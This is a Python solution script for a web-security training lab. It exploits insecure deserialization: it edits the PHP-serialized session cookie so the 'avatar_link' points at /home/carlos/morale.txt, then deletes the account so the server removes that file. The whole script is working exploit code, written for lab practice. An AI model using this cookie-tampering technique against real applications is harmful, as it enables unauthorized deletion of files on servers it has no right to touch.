import sys
import os
import base64
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession
from bs4 import BeautifulSoup

lab = LabSession()

lab.login("gregg", "rosebud")

cookie = lab.session.cookies.get("session")
raw = base64.b64decode(cookie).decode()
lab.info(f"Original: {raw}")

# change the avatar_link to point at the target file
# when we delete the account, the app deletes the file at avatar_link
modified = raw.replace(raw.split('s:23:"avatar_link";')[1].split(";}", maxsplit=1)[0] + ";}",
                       's:23:"/home/carlos/morale.txt";}')

# simpler: just rebuild with the target path
import re
modified = re.sub(r'(s:\d+:"avatar_link";)s:\d+:"[^"]*"',
                  r'\g<1>s:23:"/home/carlos/morale.txt"', raw)
lab.info(f"Modified: {modified}")

new_cookie = base64.b64encode(modified.encode()).decode()
lab.session.cookies.set("session", new_cookie)

# trigger the delete account functionality which deletes the avatar file
page = lab.get("/my-account")
soup = BeautifulSoup(page.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

lab.info("Deleting account to trigger file deletion...")
lab.post("/my-account/delete", data={"csrf": csrf})

lab.check_solved()
